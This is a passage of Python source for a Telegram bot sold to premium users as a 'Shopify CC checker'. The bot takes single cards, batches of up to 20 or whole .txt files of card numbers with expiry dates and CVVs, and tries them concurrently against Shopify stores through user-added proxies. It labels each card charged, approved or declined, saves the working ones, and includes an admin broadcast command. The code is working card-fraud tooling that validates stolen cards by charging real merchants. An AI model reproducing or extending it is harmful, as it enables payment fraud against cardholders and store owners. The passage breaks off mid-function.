        hdr = "\u274c ᴅᴇᴄʟɪɴᴇᴅ \u274c"; st = "Declined"
    msg = f"""{hdr}

\U0001f5b3 \u21fe `{card}`
\U0001f5a5 \u21fe {res.get('Gateway','Unknown')}
\U0001f4c4 \u21fe {res.get('Response')}
\U0001f3e7 \u21fe {res.get('Price')} \U0001f4b8

```\U0001f4b3 ʙɪɴ ɪɴғᴏ: {brand} - {btype} - {level}
\U0001f3e7 ʙᴀɴᴋ: {bank}
\U0001f30d ᴄᴏᴜɴᴛʀʏ: {country} {flag}```

\u23f1 {elapsed}s \u26a1 (25-ᴀᴘɪ sᴘᴇᴇᴅ)"""
    await event.reply(msg, buttons=_shop_buttons(), parse_mode="markdown")

# ---------------- /msh mass (concurrent, SPEED MAX) ----------------
@bot.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
async def shop_msh(event):
    can, acc = _shop_access(event.sender_id)
    if not can:
        return await event.reply("\U0001f6ab Premium required! /buy")
    cards = _extract_all_cards(event.raw_text[4:] if not event.is_reply else (await event.get_reply_message()).text or "")
    if not cards:
        return await event.reply("Usage: /msh cc|mm|yy|cvv cc|mm|yy|cvv ... (max 20)")
    if len(cards) > 20: cards = cards[:20]
    sites_data = await _shop_load(SHOP_FILE)
    user_sites = sites_data.get(str(event.sender_id), [])
    if not user_sites:
        return await event.reply("\u26a0\ufe0f Pehle /add site.com karo")
    status = await event.reply(f"```... ᴍᴀss ᴄʜᴇᴄᴋɪɴɢ {len(cards)} ᴄᴄs \U0001f373 (25-ᴀᴘɪ ᴛᴜʀʙᴏ)```")
    tasks = [_shop_check(c, random.choice(user_sites), event.sender_id) for c in cards]
    results = await asyncio.gather(*tasks, return_exceptions=True)  # MAX SPEED concurrent
    for card, result in zip(cards, results):
        if isinstance(result, Exception):
            result = {"Response": f"Err: {result}", "Price": "-", "Gateway": "-", "Status": "Declined"}
        rt = result.get("Response","").lower()
        if "charged" in rt or "thank you" in rt or "payment successful" in rt:
            hdr = "\U0001f48e ᴀᴘᴘʀᴏᴠᴇᴅ \U0001f48e"
            await _save_approved(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
        elif any(k in rt for k in ("invalid_cvv","insufficient_funds","approved","success","invalid_cvc","incorrect_zip")):
            hdr = "\u2705 ᴀᴘᴘʀᴏᴠᴇᴅ \u2705"
            await _save_approved(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
        else:
            hdr = "\u274c ᴅᴇᴄʟɪɴᴇᴅ \u274c"
        await event.reply(f"{hdr}\n\n\U0001f5b3 \u21fe `{card}`\n\U0001f4c4 \u21fe {result.get('Response')}\n\U0001f3e7 \u21fe {result.get('Price')} \U0001f4b8",
            parse_mode="markdown", buttons=_shop_buttons())
        await asyncio.sleep(0.05)
    try: await status.edit(f"```... ᴍᴀss ᴄʜᴇᴄᴋɪɴɢ ᴅᴏɴᴇ \u2705 {len(cards)} ᴄᴄs```")
    except: pass

# ---------------- /mtxt file check with stop ----------------
ACTIVE_SH = {}

@bot.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def shop_mtxt(event):
    can, acc = _shop_access(event.sender_id)
    if not can: return await event.reply("\U0001f6ab Premium required! /buy")
    uid = event.sender_id
    if uid in ACTIVE_SH: return await event.reply("```... ᴘʀᴏᴄᴇss ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ```")
    if not event.is_reply: return await event.reply("Reply to a .txt file with cards: /mtxt")
    r = await event.get_reply_message()
    if not r or not r.document: return await event.reply("Reply to a .txt file with cards")
    fp = await r.download_media()
    try:
        async with aiofiles.open(fp, "r") as f: lines = (await f.read()).splitlines()
    finally:
        try: os.remove(fp)
        except: pass
    cards = [l.strip() for l in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', l.strip())]
    if not cards: return await event.reply("No valid cards found \U0001f972")
    limit = _shop_limit(uid, acc)
    if len(cards) > limit: cards = cards[:limit]
    sites_data = await _shop_load(SHOP_FILE)
    user_sites = sites_data.get(str(uid), [])
    if not user_sites: return await event.reply("\u26a0\ufe0f Pehle /add site.com")
    ACTIVE_SH[uid] = True
    asyncio.create_task(_mtxt_worker(event, cards, user_sites))

async def _mtxt_worker(event, cards, sites):
    uid = event.sender_id
    total = len(cards); checked = approved = charged = declined = 0
    status = await event.reply(f"```... sᴛᴀʀᴛᴇᴅ \U0001f373```")
    try:
        for i in range(0, total, 10):
            if uid not in ACTIVE_SH: break
            batch = cards[i:i+10]
            tasks = [_shop_check(c, random.choice(sites), uid) for c in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for card, result in zip(batch, results):
                if uid not in ACTIVE_SH: break
                if isinstance(result, Exception): result = {"Response": f"Err: {result}", "Price": "-", "Gateway": "-"}
                checked += 1
                rt = result.get("Response","").lower()
                if "charged" in rt or "thank you" in rt or "payment successful" in rt:
                    charged += 1
                    await _save_approved(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    await event.reply(f"\U0001f48e ᴀᴘᴘʀᴏᴠᴇᴅ \U0001f48e\n\n\U0001f5b3 \u21fe `{card}`\n\U0001f4c4 \u21fe {result.get('Response')}\n\U0001f3e7 \u21fe {result.get('Price')}",
                        parse_mode="markdown", buttons=_shop_buttons())
                elif any(k in rt for k in ("invalid_cvv","insufficient_funds","approved","success","invalid_cvc","incorrect_zip")):
                    approved += 1
                    await _save_approved(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    await event.reply(f"\u2705 ᴀᴘᴘʀᴏᴠᴇᴅ \u2705\n\n\U0001f5b3 \u21fe `{card}`\n\U0001f4c4 \u21fe {result.get('Response')}\n\U0001f3e7 \u21fe {result.get('Price')}",
                        parse_mode="markdown", buttons=_shop_buttons())
                else:
                    declined += 1
            btns = [
                [Button.inline(f"\U0001f48e ᴄʜᴀʀɢᴇᴅ \u279c [ {charged} ]", b"none", style="success")],
                [Button.inline(f"\U0001f525 ᴀᴘᴘʀᴏᴠᴇᴅ \u279c [ {approved} ]", b"none", style="primary")],
                [Button.inline(f"\u274c ᴅᴇᴄʟɪɴᴇᴅ \u279c [ {declined} ]", b"none", style="danger")],
                [Button.inline(f"\u23f3 ᴘʀᴏɢʀᴇss \u279c [{checked}/{total}]", b"none", style="primary")],
                [Button.inline("\u26d4 sᴛᴏᴘ", f"stopsh:{uid}".encode(), style="danger")],
            ]
            try: await status.edit(f"```... ᴄʜᴇᴄᴋɪɴɢ ᴄᴄs \U0001f373 [{checked}/{total}]```", buttons=btns)
            except: pass
        fin = f"""\u2705 ᴅᴏɴᴇ!
\U0001f48e ᴄʜᴀʀɢᴇᴅ: {charged}
\U0001f525 ᴀᴘᴘʀᴏᴠᴇᴅ: {approved}
\u274c ᴅᴇᴄʟɪɴᴇᴅ: {declined}
\u23f3 ᴛᴏᴛᴀʟ: {total}"""
        try: await status.edit(fin, buttons=_shop_buttons())
        except: pass
    finally:
        ACTIVE_SH.pop(uid, None)

@bot.on(events.CallbackQuery(pattern=rb"stopsh:(\d+)"))
async def stop_sh_cb(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and not is_admin(event.sender_id):
        return await event.answer("Not allowed!", alert=True)
    ACTIVE_SH.pop(uid, None)
    await event.answer("\u26d4 Stopped!", alert=True)

# ---------------- /ran random-site file check ----------------
@bot.on(events.NewMessage(pattern=r'(?i)^[/.]ran(d|for)?$'))
async def shop_ran(event):
    can, acc = _shop_access(event.sender_id)
    if not can: return await event.reply("\U0001f6ab Premium required! /buy")
    uid = event.sender_id
    if uid in ACTIVE_SH: return await event.reply("```... ᴘʀᴏᴄᴇss ʀᴜɴɴɪɴɢ```")
    if not event.is_reply: return await event.reply("Reply to a .txt file with cards: /ran")
    r = await event.get_reply_message()
    if not r or not r.document: return await event.reply("Reply to a .txt file")
    if not os.path.exists(RANFOR_SITES_FILE):
        return await event.reply("\u274c sites.txt missing!")
    async with aiofiles.open(RANFOR_SITES_FILE, 'r') as f:
        gsites = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
    if not gsites: return await event.reply("\u274c sites.txt empty!")
    fp = await r.download_media()
    try:
        async with aiofiles.open(fp, "r") as f: lines = (await f.read()).splitlines()
    finally:
        try: os.remove(fp)
        except: pass
    cards = [l.strip() for l in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', l.strip())]
    if not cards: return await event.reply("No valid cards \U0001f972")
    limit = _shop_limit(uid, acc)
    if len(cards) > limit: cards = cards[:limit]
    ACTIVE_SH[uid] = True
    asyncio.create_task(_mtxt_worker(event, cards, gsites))

# ---------------- /add /rm sites ----------------
def _valid_site(u):
    d = str(u).lower().strip()
    if d.startswith(('http://','https://')):
        d = _urlparse(d).netloc
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d)), d

@bot.on(events.NewMessage(pattern=r'(?i)^/add\s'))
async def shop_add(event):
    can, acc = _shop_access(event.sender_id)
    if not can: return await event.reply("\U0001f6ab Premium required!")
    raw = event.raw_text[4:].strip()
    to_add = []
    for tok in raw.replace(',', ' ').split():
        ok, dom = _valid_site(tok)
        if ok and dom not in to_add: to_add.append(dom)
    if not to_add: return await event.reply("Usage: /add site.com site2.com")
    data = await _shop_load(SHOP_FILE)
    mine = data.get(str(event.sender_id), [])
    new = [s for s in to_add if s not in mine]
    mine.extend(new)
    data[str(event.sender_id)] = mine
    await _shop_save(SHOP_FILE, data)
    await event.reply("\n".join([f"\u2705 Added: {s}" for s in new] + [f"\u26a0\ufe0f Already: {s}" for s in to_add if s not in new] + [f"\U0001f4cd Total: {len(mine)}"]),
        buttons=_shop_buttons())

@bot.on(events.NewMessage(pattern=r'(?i)^/rm\s'))
async def shop_rm(event):
    raw = event.raw_text[3:].strip()
    to_rm = [t.strip().lower().replace('https://','').replace('http://','').rstrip('/') for t in raw.replace(',',' ').split() if t.strip()]
    if not to_rm: return await event.reply("Usage: /rm site.com")
    data = await _shop_load(SHOP_FILE)
    mine = data.get(str(event.sender_id), [])
    removed = [s for s in to_rm if s in mine]
    mine = [s for s in mine if s not in to_rm]
    data[str(event.sender_id)] = mine
    await _shop_save(SHOP_FILE, data)
    await event.reply("\n".join([f"\u2705 Removed: {s}" for s in removed] or ["\u274c Not found"]) + f"\n\U0001f4cd Total: {len(mine)}",
        buttons=_shop_buttons())

# ---------------- /addpxy /rmpxy ----------------
def _parse_pxy(p):
    p = p.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', p, re.IGNORECASE)
    if m: pt, p = m.group(1).lower(), m.group(2)
    u = pw = host = port = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', p)
    if m: u, pw, host, port = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', p):
        h, po, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', p).groups()
        if 0 < int(po) <= 65535: host, port = h, po
    elif re.match(r'^([^:@]+):(\d+)$', p):
        host, port = re.match(r'^([^:@]+):(\d+)$', p).groups()
    else: return None
    if not host or not port: return None
    try:
        if not (0 < int(port) <= 65535): return None
    except: return None
    if u and pw: purl = f'{pt}://{u}:{pw}@{host}:{port}'
    else: purl = f'{pt}://{host}:{port}'
    return {'ip': host, 'port': port, 'username': u or None, 'password': pw or None, 'proxy_url': purl, 'type': pt}

@bot.on(events.NewMessage(pattern=r'(?i)^/addpxy'))
async def shop_addpxy(event):
    if event.is_group: return await event.reply("\U0001f512 Private only!")
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2: return await event.reply("Usage: /addpxy ip:port:username:password")
    pd = _parse_pxy(parts[1])
    if not pd: return await event.reply("\u274c Invalid proxy format!")
    data = await _shop_load(SHOP_PXY_FILE)
    mine = data.get(str(event.sender_id), [])
    if len(mine) >= 10: return await event.reply("\u274c Max 10 proxies!")
    if any(x['proxy_url'] == pd['proxy_url'] for x in mine): return await event.reply("\u26a0\ufe0f Already exists!")
    tst = await event.reply("\U0001f504 Testing proxy...")
    ok = False
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('http://api.ipify.org?format=json', proxy=pd['proxy_url']) as res:
                ok = res.status == 200
    except Exception: ok = False
    if not ok:
        return await tst.edit("\u274c Proxy dead!")
    mine.append(pd)
    data[str(event.sender_id)] = mine
    await _shop_save(SHOP_PXY_FILE, data)
    await tst.edit(f"\u2705 Proxy added! ({pd['ip']}:{pd['port']}) [{len(mine)}/10]")

@bot.on(events.NewMessage(pattern=r'(?i)^/rmpxy'))
async def shop_rmpxy(event):
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2: return await event.reply("Usage: /rmpxy ip:port")
    tgt = parts[1].strip().lower()
    data = await _shop_load(SHOP_PXY_FILE)
    mine = data.get(str(event.sender_id), [])
    before = len(mine)
    mine = [x for x in mine if tgt not in x.get('proxy_url','').lower()]
    data[str(event.sender_id)] = mine
    await _shop_save(SHOP_PXY_FILE, data)
    await event.reply(f"\u2705 Removed {before - len(mine)} proxy(s). Total: {len(mine)}")

# ---------------- /info ----------------
@bot.on(events.NewMessage(pattern=r'(?i)^/info$'))
async def shop_info(event):
    user = await event.get_sender()
    uid = event.sender_id
    data = await _shop_load(SHOP_FILE)
    mine = data.get(str(uid), [])
    st = "\u2705 Premium" if (is_admin(uid) or is_premium(uid)) else "\u274c Free"
    sites_txt = "\n".join(f"{i+1}. {s}" for i, s in enumerate(mine)) or "No sites"
    await event.reply(f"""\U0001f464 \U0001f5ee ɪɴғᴏ

\U0001f464 \u21fe {(user.first_name or 'N/A')} {(user.last_name or '')}
\U0001f5ee \u21fe @{user.username} ({uid})
\U0001f5f4 sᴛᴀᴛᴜs \u21fe {st}
\U0001f5cd sɪᴛᴇs ({len(mine)}):
```
{sites_txt}```""", buttons=_shop_buttons(), parse_mode="markdown")

# ---------------- /broadcast (ADMIN) ----------------
_broadcast_pending = {}

@bot.on(events.NewMessage(pattern=r'(?i)^/broadcast'))
async def broadcast_cmd(event):
    if not is_admin(event.sender_id):
        return await event.reply("\U0001f6ab Admin only!")
    msg = event.raw_text.split(maxsplit=1)
    if len(msg) == 2:
        return await _do_broadcast(event, msg[1])
    _broadcast_pending[event.sender_id] = True
    await event.reply(premium_emoji("\U0001f4e3 **Broadcast mode ON** - ab jo message bhejo wo sab users ko jayega.\n/cancel se cancel karo."),
        parse_mode="html", buttons=[[Button.inline("\u274c ᴄᴀɴᴄᴇʟ", b"bc_cancel", style="danger")]])

@bot.on(events.NewMessage(pattern=r'(?i)^/cancel$'))
async def cancel_bc(event):
    _broadcast_pending.pop(event.sender_id, None)
    await event.reply("\u274c Cancelled.")

@bot.on(events.CallbackQuery(pattern=b"bc_cancel"))
async def bc_cancel_cb(event):
    _broadcast_pending.pop(event.sender_id, None)
    await event.answer("Cancelled!", alert=True)
    try: await event.edit("\u274c Broadcast cancelled.")
    except: pass

@bot.on(events.NewMessage(pattern=None))
async def broadcast_catch(event):
    uid = event.sender_id
    if not _broadcast_pending.get(uid): return
    if event.raw_text and event.raw_text.lower().startswith(('/broadcast','/cancel')): return
    _broadcast_pending.pop(uid, None)
    await _do_broadcast(event, event.raw_text)

async def _do_broadcast(event, text):
    m = await event.reply("\U0001f4e3 Broadcasting...")
    sent = failed = 0
    try:
        conn = sqlite3.connect('users.db')
        cur = conn.cursor()
        cur.execute("SELECT user_id FROM users")
        ids = [r[0] for r in cur.fetchall()]
        conn.close()
    except Exception:
        ids = []
    if not ids:
        try:
            conn = sqlite3.connect('users.db')
            conn.close()
        except: pass
        return await m.edit("\u274c No users found in DB!")
    for uid in ids:
        try:
            await bot.send_message(uid, premium_emoji(text), parse_mode="html")
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)  # flood-safe
    await m.edit(f"\u2705 Broadcast done!\n\U0001f4e8 Sent: {sent}\n\u274c Failed: {failed}")

# ---------------- shop commands in /start help (register help text) ----------------
SHOP_HELP = """
\U0001f5f4 **sʜᴏᴘɪꜰʏ ᴄʜᴇᴄᴋᴇʀ (25 ᴀᴘɪ ᴛᴜʀʙᴏ)**
/sh cc|mm|yy|cvv - single check \u26a1
/msh cc cc cc - mass (20) \U0001f525
/mtxt (reply .txt) - file check \U0001f4c4
/ran (reply .txt) - random sites \U0001f3b2
/add site.com - add site
/rm site.com - remove site
/addpxy ip:port:user:pass - proxy
/rmpxy ip:port - remove proxy
/info - your info
/broadcast - admin broadcast \U0001f4e3
"""

from urllib.parse import quote_plus

print("\u2705 Merged @AutoShopify features loaded (25 APIs, broadcast, turbo speed)")


# =====================================================================
# ===== SHOPIFY INLINE-BUTTON MENU (colorful + random premium emojis) =
# =====================================================================
# User ko /commands typing NAHI karni — sab kuch colorful inline buttons se!
_shop_pending = {}

SHOP_MENU_TEXT = (
    "<b>🛒 sʜᴏᴘɪꜰʏ ᴄᴄ ᴄʜᴇᴄᴋᴇʀ — 25 ᴀᴘɪ ᴛᴜʀʙᴏ ⚡</b>\n"
    "━━━━━━━━━━━━━━━━━━━━\n"
    "👆 <b>ɴᴇᴇᴄʜᴇ ᴀɴʏ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴏ — ᴛʏᴘɪɴɢ ᴋɪ ᴢᴀʀᴜʀᴀᴛ ɴʜɪɴ</b>\n"
    "━━━━━━━━━━━━━━━━━━━━\n"
    "💳 sɪɴɢʟᴇ | 🔥 ᴍᴀss(20) | 📄 ꜰɪʟᴇ | 🎲 ʀᴀɴᴅᴏᴍ\n"
    "➕ sɪᴛᴇs | 🌐 ᴘʀᴏxɪᴇs | 📊 ɪɴꜰᴏ\n"
    "━━━━━━━━━━━━━━━━━━━━"
)

def _shop_menu_buttons():
    """Colorful inline buttons + random premium emoji icons (rb_icon)"""
    return [
        [
            Button.inline("sɪɴɢʟᴇ ᴄᴄ ᴄʜᴇᴄᴋ", b"shop_sh", style="success"),
            Button.inline("ᴍᴀss ᴄʜᴇᴄᴋ (20)", b"shop_msh", style="danger"),
        ],
        [
            Button.inline("ꜰɪʟᴇ ᴄʜᴇᴄᴋ (.ᴛxᴛ)", b"shop_mtxt", style="primary"),
            Button.inline("ʀᴀɴᴅᴏᴍ sɪᴛᴇs ᴄʜᴇᴄᴋ", b"shop_ran", style="primary"),
        ],
        [
            Button.inline("ᴀᴅᴅ sɪᴛᴇ", b"shop_add", style="success"),
            Button.inline("ʀᴇᴍᴏᴠᴇ sɪᴛᴇ", b"shop_rm", style="danger"),
            Button.inline("ᴍʏ sɪᴛᴇs", b"shop_mysites", style="primary"),
        ],
        [
            Button.inline("ᴀᴅᴅ ᴘʀᴏxʏ", b"shop_addpxy", style="success"),
            Button.inline("ʀᴍ ᴘʀᴏxʏ", b"shop_rmpxy", style="danger"),
            Button.inline("ᴍʏ ᴘʀᴏxɪᴇs", b"shop_mypxies", style="primary"),
        ],
        [
            Button.inline("ᴍʏ ɪɴꜰᴏ", b"shop_info", style="success"),
            Button.inline("ʀᴇꜰʀᴇsʜ ᴍᴇɴᴜ", b"shop_menu", style="primary"),
        ],
        [
            Button.inline("ʜᴏᴍᴇ", b"back_to_start", style="primary"),
        ],
    ]

@bot.on(events.CallbackQuery(pattern=b"shop_menu"))
async def shop_menu_open(event):
    _shop_pending.pop(event.sender_id, None)
    try: await event.answer()
    except: pass
    await bot.send_message(event.chat_id, premium_emoji(SHOP_MENU_TEXT),
        buttons=_shop_menu_buttons(), parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"shop_cancel"))
async def shop_cancel_cb(event):
    _shop_pending.pop(event.sender_id, None)
    try: await event.answer("❌ Cancelled!", alert=False)
    except: pass
    try: await event.edit("❌ Cancelled.")
    except: pass

# ---- action buttons -> set pending & prompt user ----
_SHOP_PROMPTS = {
    "sh": ("💳 <b>ᴄᴀʀᴅ ʙʜᴇᴊᴏ:</b> <code>cc|mm|yy|cvv</code>", "shop_sh"),
    "msh": ("🔥 <b>ᴄᴀʀᴅs ʙʜᴇᴊᴏ (ᴍᴀx 20):</b> <code>cc|mm|yy|cvv cc|mm|yy|cvv ...</code>", "shop_msh"),
    "mtxt": ("📄 <b>ᴀᴀᴘᴀsᴀ .ᴛxᴛ ꜰɪʟᴇ ᴘᴇ ʀᴇᴘʟʏ ᴋᴀʀᴏ</b> (ꜰɪʟᴇ ᴍᴇᴄᴀʀᴅs ʜᴏɴɪ ᴄʜᴀʜɪʏᴇ)", "shop_mtxt"),
    "ran": ("🎲 <b>.ᴛxᴛ ꜰɪʟᴇ ᴘᴇ ʀᴇᴘʟʏ ᴋᴀʀᴏ</b> (ʀᴀɴᴅᴏᴍ sɪᴛᴇs ᴘᴇ ᴄʜᴇᴄᴋ ʜᴏɢᴀ)", "shop_ran"),
    "add": ("➕ <b>sɪᴛᴇs ʙʜᴇᴊᴏ:</b> <code>site.com site2.com</code>", "shop_add"),
    "rm": ("🗑 <b>ʀᴇᴍᴏᴠᴇ ᴋᴀʀɴᴇ ᴡᴀʟᴇ sɪᴛᴇs:</b> <code>site.com</code>", "shop_rm"),
    "addpxy": ("🌐 <b>ᴘʀᴏxʏ ʙʜᴇᴊᴏ:</b> <code>ip:port:user:pass</code>", "shop_addpxy"),
}

async def _shop_btn_prompt(event, kind):
    uid = event.sender_id
    can, acc = _shop_access(uid)
    if not can:
        try: await event.answer("Premium chahiye! /buy dabao", alert=True)
        except: pass
        return
    _shop_pending[uid] = {"type": kind}
    try: await event.answer()
    except: pass
    txt = _SHOP_PROMPTS[kind][0]
    await bot.send_message(event.chat_id, premium_emoji(txt), parse_mode="html",
        buttons=[[Button.inline("ᴄᴀɴᴄᴇʟ", b"shop_cancel", style="danger")]])

@bot.on(events.CallbackQuery(pattern=b"shop_sh"))
async def shop_sh_btn(event): await _shop_btn_prompt(event, "sh")

@bot.on(events.CallbackQuery(pattern=b"shop_msh"))
async def shop_msh_btn(event): await _shop_btn_prompt(event, "msh")

@bot.on(events.CallbackQuery(pattern=b"shop_mtxt"))
async def shop_mtxt_btn(event): await _shop_btn_prompt(event, "mtxt")

@bot.on(events.CallbackQuery(pattern=b"shop_ran"))
async def shop_ran_btn(event): await _shop_btn_prompt(event, "ran")

@bot.on(events.CallbackQuery(pattern=b"shop_add"))
async def shop_add_btn(event): await _shop_btn_prompt(event, "add")

@bot.on(events.CallbackQuery(pattern=b"shop_rm"))
async def shop_rm_btn(event): await _shop_btn_prompt(event, "rm")

@bot.on(events.CallbackQuery(pattern=b"shop_addpxy"))
async def shop_addpxy_btn(event): await _shop_btn_prompt(event, "addpxy")

# ---- instant info buttons ----
@bot.on(events.CallbackQuery(pattern=b"shop_mysites"))
async def shop_mysites_cb(event):
    try: await event.answer()
    except: pass
    data = await _shop_load(SHOP_FILE)
    mine = data.get(str(event.sender_id), [])
    txt = "\n".join(f"📋 {i+1}. {s}" for i, s in enumerate(mine)) or "❌ Koi site nahi — ➕ ᴀᴅᴅ sɪᴛᴇ dabao"
    await bot.send_message(event.chat_id, premium_emoji(f"📋 <b>ᴍʏ sɪᴛᴇs ({len(mine)})</b>\n\n{txt}"),
        parse_mode="html", buttons=_shop_menu_buttons())

@bot.on(events.CallbackQuery(pattern=b"shop_mypxies"))
async def shop_mypxies_cb(event):
    try: await event.answer()
    except: pass
    data = await _shop_load(SHOP_PXY_FILE)
    mine = data.get(str(event.sender_id), [])
    txt = "\n".join(f"🌐 {x.get('ip')}:{x.get('port')} ({x.get('type','http').upper()})" for x in mine) or "❌ Koi proxy nahi — 🌐 ᴀᴅᴅ ᴘʀᴏxʏ dabao"
    await bot.send_message(event.chat_id, premium_emoji(f"🖥 <b>ᴍʏ ᴘʀᴏxɪᴇs ({len(mine)}/10)</b>\n\n{txt}"),
        parse_mode="html", buttons=_shop_menu_buttons())

@bot.on(events.CallbackQuery(pattern=b"shop_rmpxy"))
async def shop_rmpxy_btn2(event):
    await _shop_btn_prompt(event, "addpxy") if False else None
    uid = event.sender_id
    can, acc = _shop_access(uid)
    if not can:
        try: await event.answer("Premium chahiye!", alert=True)
        except: pass
        return
    _shop_pending[uid] = {"type": "rmpxy"}
    try: await event.answer()
    except: pass
    await bot.send_message(event.chat_id, premium_emoji("🧹 <b>ʀᴇᴍᴏᴠᴇ ᴋᴀʀɴᴇ ᴡᴀʟᴀ ᴘʀᴏxʏ ʙʜᴇᴊᴏ:</b> <code>ip:port</code>"),
        parse_mode="html", buttons=[[Button.inline("ᴄᴀɴᴄᴇʟ", b"shop_cancel", style="danger")]])

@bot.on(events.CallbackQuery(pattern=b"shop_info"))
async def shop_info_cb(event):
    try: await event.answer()
    except: pass
    user = await event.get_sender()
    uid = event.sender_id
    data = await _shop_load(SHOP_FILE)
    mine = data.get(str(uid), [])
    st = "👑 ᴀᴅᴍɪɴ" if is_admin(uid) else ("💎 ᴘʀᴇᴍɪᴜᴍ" if is_premium(uid) else "⭐ ꜰʀᴇᴇ")
    await bot.send_message(event.chat_id, premium_emoji(
        f"📊 <b>ᴍʏ ɪɴꜰᴏ</b>\n━━━━━━━━━━\n"
        f"👤 {(user.first_name or 'N/A')} {(user.last_name or '')}\n"
        f"🆔 <code>{uid}</code>\n"
        f"📋 sᴛᴀᴛᴜs: {st}\n"
        f"🌐 sɪᴛᴇs: {len(mine)}\n"
        f"⚡ ᴀᴘɪs: 25 (ᴛᴜʀʙᴏ)"),
        parse_mode="html", buttons=_shop_menu_buttons())

# ---- pending message catcher (user ka next message = input) ----
@bot.on(events.NewMessage(pattern=None))
async def shop_pending_catch(event):
    uid = event.sender_id
    p = _shop_pending.get(uid)
    if not p: return
    txt = (event.raw_text or "")
    if txt.startswith('/'):
        _shop_pending.pop(uid, None)
        return
    kind = p.get("type")
    _shop_pending.pop(uid, None)

    if kind == "sh":
        card = _extract_card(txt)
        if not card:
            _shop_pending[uid] = {"type": "sh"}
            return await event.reply("❌ Invalid! Format: cc|mm|yy|cvv")
        data = await _shop_load(SHOP_FILE)
        sites = data.get(str(uid), [])
        if not sites:
            return await event.reply("⚠️ Pehle site add karo (➕ ᴀᴅᴅ sɪᴛᴇ button)", buttons=_shop_menu_buttons())
        loading = await event.reply("🍳")
        t0 = time.time()
        res = await _shop_check(card, random.choice(sites), uid)
        try: await loading.delete()
        except: pass
        el = round(time.time() - t0, 2)
        brand, btype, level, bank, country, flag = await _get_bin_info(card.split("|")[0])
        rt = res.get("Response", "").lower()
        if "charged" in rt or "thank you" in rt or "payment successful" in rt:
            hdr = "💎 ᴀᴘᴘʀᴏᴠᴇᴅ 💎"
            await _save_approved(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif any(k in rt for k in ("invalid_cvv","insufficient_funds","approved","success","invalid_cvc","incorrect_zip")):
            hdr = "✅ ᴀᴘᴘʀᴏᴠᴇᴅ ✅"
            await _save_approved(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
        else:
            hdr = "❌ ᴅᴇᴄʟɪɴᴇᴅ ❌"
        await event.reply(f"""{hdr}

💳 ⟵ `{card}`
🖥 ⟵ {res.get('Gateway','Unknown')}
📄 ⟵ {res.get('Response')}
🏦 ⟵ {res.get('Price')} 💸

```💳 ʙɪɴ: {brand} - {btype} - {level}
🏦 ʙᴀɴᴋ: {bank}
🌍 {country} {flag}```

⏱ {el}s ⚡ 25-ᴀᴘɪ ᴛᴜʀʙᴏ""",
            parse_mode="markdown", buttons=_shop_buttons())

    elif kind == "msh":
        cards = _extract_all_cards(txt)
        if not cards:
            _shop_pending[uid] = {"type": "msh"}
            return await event.reply("❌ Koi valid card nahi mila!")
        if len(cards) > 20: cards = cards[:20]
        data = await _shop_load(SHOP_FILE)
        sites = data.get(str(uid), [])
        if not sites:
            return await event.reply("⚠️ Pehle site add karo!", buttons=_shop_menu_buttons())
        st = await event.reply(f"```... ᴛᴜʀʙᴏ ᴍᴀss {len(cards)} ᴄᴄs 🍳```")
        tasks = [_shop_check(c, random.choice(sites), uid) for c in cards]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for card, result in zip(cards, results):
            if isinstance(result, Exception):
                result = {"Response": f"Err: {result}", "Price": "-", "Gateway": "-", "Status": "Declined"}
            rt = result.get("Response", "").lower()
            if "charged" in rt or "thank you" in rt or "payment successful" in rt:
                hdr = "💎 ᴀᴘᴘʀᴏᴠᴇᴅ 💎"
                await _save_approved(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif any(k in rt for k in ("invalid_cvv","insufficient_funds","approved","success","invalid_cvc","incorrect_zip")):
                hdr = "✅ ᴀᴘᴘʀᴏᴠᴇᴅ ✅"
                await _save_approved(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            else:
                hdr = "❌ ᴅᴇᴄʟɪɴᴇᴅ ❌"
            await event.reply(f"{hdr}\n\n💳 ⟵ `{card}`\n📄 ⟵ {result.get('Response')}\n🏦 ⟵ {result.get('Price')} 💸",
                parse_mode="markdown", buttons=_shop_buttons())
            await asyncio.sleep(0.05)
        try: await st.edit(f"```✅ ᴅᴏɴᴇ — {len(cards)} ᴄᴄs ᴛᴜʀʙᴏ ᴄʜᴇᴄᴋᴇᴅ```")
        except: pass

    elif kind in ("mtxt", "ran"):
        if not event.is_reply:
            _shop_pending[uid] = {"type": kind}
            return await event.reply("📄 .txt file pe REPLY karo!")
        r = await event.get_reply_message()
        if not r or not r.document:
            _shop_pending[uid] = {"type": kind}
            return await event.reply("📄 .txt file pe reply karo (document)!")
        if kind == "ran":
            if not os.path.exists(RANFOR_SITES_FILE):
